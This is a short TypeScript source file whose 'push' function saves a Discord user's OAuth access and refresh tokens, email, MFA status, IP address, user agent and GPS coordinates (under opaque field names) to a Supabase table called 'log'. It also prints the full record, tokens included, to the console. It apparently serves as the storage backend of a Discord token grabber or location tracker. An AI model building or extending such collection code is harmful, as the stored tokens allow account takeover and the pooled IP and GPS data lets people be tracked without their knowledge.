import { DiscordUser, IpInfo, GpsData } from "@/lib/types";
import { supabase } from "@/lib/utils/supabase/client";

export async function push(
  accessToken: string,
  refreshToken: string,
  userInfo: DiscordUser,
  ipInfo: IpInfo,
  ua: string,
  gps: GpsData
) {
  try {
    const userData = {
      user_id: userInfo.id,
      user_name: userInfo.username,
      global_name: userInfo.global_name,
      avatar_id: userInfo.avatar,
      email: userInfo.email,
      mfa_enabled: userInfo.mfa_enabled,
      locale: userInfo.locale,
      verified: userInfo.verified,
      ip: ipInfo.ip,
      user_agent: ua,
      gps: {
        accuracy: gps.ff,
        latitude: gps.hh,
        longitude: gps.xf,
      },
      refresh_token: refreshToken,
      access_token: accessToken,
      created_at: new Date().toISOString(),
    };

    console.log("Preparing to insert data:", JSON.stringify(userData));

    const { data, error } = await supabase.from("log").upsert(userData, {
      onConflict: "user_id",
    });

    if (error) {
      console.log("Supabase insertion error:", error);
      return { success: false, error };
    }

    console.log("Data inserted successfully:", data);
    return { success: true, data };
  } catch (error) {
    console.error("push error:", error);
    return { success: false, error };
  }
}
